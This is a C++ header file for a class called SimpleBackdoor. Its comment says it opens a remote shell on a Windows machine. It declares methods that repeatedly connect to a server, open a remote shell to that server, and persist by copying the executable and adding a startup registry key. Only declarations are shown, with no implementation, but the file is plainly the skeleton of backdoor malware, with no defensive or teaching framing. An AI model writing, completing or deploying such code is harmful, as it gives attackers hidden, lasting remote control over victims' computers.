/*
Class SimpleBackdoor

opens a remote shell on a windows machine.
*/

#ifndef H_SIMPLEBACKDOOR
#define H_SIMPLEBACKDOOR

#define _WIN32_WINNT 0x501
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#define RECV_BUFLEN 512
#define CMD_BUFLEN 4096

class SimpleBackdoor {

    SimpleBackdoor();

    static SimpleBackdoor* instance;

    SOCKET connectSocket;

    void log(std::string line);

public:

    ~SimpleBackdoor();

    static SimpleBackdoor* getInstance();

    //tries to connect to the server until it succeeds
    void connectToServer(std::string ip, std::string port);

    //opens a remote shell to the servers
    void doShell();

    //copies the exe file and adds registry key to be launched at startup
    void persist(std::string programName);
};

#endif
